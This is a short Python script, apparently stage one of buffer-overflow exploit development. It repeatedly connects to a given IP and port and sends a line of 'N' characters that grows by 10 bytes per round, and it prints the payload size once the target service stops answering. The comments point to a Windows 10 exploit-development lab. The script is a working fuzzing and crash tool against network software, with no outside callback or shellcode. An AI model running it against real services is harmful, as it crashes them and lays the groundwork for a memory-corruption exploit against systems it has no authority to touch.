#!/usr/bin/env python3
# usage: ./stage1.py [ip] [port]
import socket,sys,time
from termcolor import colored, cprint

# Handle Remote Host  
RHOST = sys.argv[1]
RPORT = int(sys.argv[2])

# Handle Payload
payload = "\x4E"
payload_size = 50 
postfix = "\n"
buff_size = 0

while True:
    try:
        # Setup Payload
        buff = bytes(payload * payload_size + postfix, encoding="ascii")
        buff_size = len(buff) - len(postfix) 


        # Payload Status
        print(colored("[+] - Sending Payload - [ {} Bytes ]".format(buff_size), "red"))


        # Handle Connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((RHOST, RPORT))
        s.send(buff)
        response = s.recv(1024)
        s.close()

        # Increment the Payload Size by 10 bytes
        payload_size += 10
        time.sleep(2)       
    except:
        # Once the applicaton breaks kill it
        # on the exploit development WIN10 machine
        # to display the message 
        print(colored("[!] - Crash Detected  -> [ {} Bytes ]".format(buff_size), "green", attrs=["bold", "blink"]))
        sys.exit(0)


